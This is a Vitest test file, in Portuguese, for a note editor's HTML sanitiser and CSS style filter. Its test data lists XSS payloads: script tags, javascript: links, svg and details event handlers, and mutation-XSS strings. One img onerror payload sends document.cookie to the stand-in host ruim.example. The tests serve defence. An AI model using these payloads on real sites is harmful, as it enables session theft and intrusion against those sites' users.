// @vitest-environment jsdom
import { describe, expect, it } from "vitest"
import { estiloDaNota, limpaHtmlDaNota } from "./html-da-nota"

const semScript = (html: string) => {
  const limpo = limpaHtmlDaNota(html)
  expect(limpo).not.toMatch(/<script|onerror|onload|onclick|javascript:|<iframe|<object|<embed|<svg|<math|<style|<form/i)
  return limpo
}

describe("limpaHtmlDaNota — o que o editor escreve continua igual", () => {
  it.each([
    "<b>negrito</b> <i>itálico</i> <u>sublinhado</u>",
    "<ul><li>um</li><li>dois</li></ul><ol><li>três</li></ol>",
    "<h2>Título</h2><div>linha</div><div><br></div>",
    '<font size="5">grande</font>',
    '<span style="color: rgb(239, 68, 68);">vermelho</span>',
    '<span style="background-color: rgba(234, 179, 8, 0.32);">marca-texto</span>',
    '<img src="data:image/png;base64,iVBORw0KGgo=" style="width: 50%; height: auto;">',
  ])("%s", (html) => {
    const div = (h: string) => { const d = document.createElement("div"); d.innerHTML = h; return d.innerHTML }
    expect(limpaHtmlDaNota(html)).toBe(div(html))
  })
})

describe("limpaHtmlDaNota — o que roda código sai", () => {
  it("o ataque que motivou isto: imagem com onerror", () => {
    const limpo = semScript('<img src=x onerror="fetch(\'https://ruim.example/?c=\'+document.cookie)">')
    expect(limpo).toContain("<img")
  })

  it.each([
    "<script>alert(1)</script>texto",
    '<a href="javascript:alert(1)">link</a>',
    '<a href="JaVaScRiPt:alert(1)">link</a>',
    '<iframe src="https://ruim.example"></iframe>',
    '<object data="x.swf"></object><embed src="x.swf">',
    "<svg><script>alert(1)</script></svg>",
    '<svg onload="alert(1)"><circle r="5"/></svg>',
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<div onclick="alert(1)" onmouseover="alert(2)">passe o mouse</div>',
    "<style>body{display:none}</style>texto",
    '<form action="https://ruim.example"><input name="senha"></form>',
    '<img src="javascript:alert(1)">',
    '<details open ontoggle="alert(1)">x</details>',
  ])("%s", (html) => {
    semScript(html)
  })

  it("link normal fica", () => {
    expect(limpaHtmlDaNota('<a href="https://neurotask.app">site</a>')).toBe('<a href="https://neurotask.app">site</a>')
  })
})

describe("estiloDaNota", () => {
  it("fica o que o editor escreve", () => {
    expect(estiloDaNota("color: rgb(239, 68, 68); background-color: transparent")).toBe(
      "color: rgb(239, 68, 68); background-color: transparent;",
    )
    expect(estiloDaNota("width: 50%; height: auto;")).toBe("width: 50%; height: auto;")
  })

  it("sai o que carrega URL ou cobre a tela", () => {
    expect(estiloDaNota("background: url(https://ruim.example/rastreio.png)")).toBe("")
    expect(estiloDaNota("color: red; position: fixed; inset: 0; z-index: 9999")).toBe("color: red;")
    expect(estiloDaNota("background-color: red; width: url(x)")).toBe("background-color: red;")
    expect(estiloDaNota("color: \\72 ed")).toBe("")
  })

  it("lixo não quebra", () => {
    expect(estiloDaNota("")).toBe("")
    expect(estiloDaNota(";;;")).toBe("")
    expect(estiloDaNota(": red")).toBe("")
  })
})
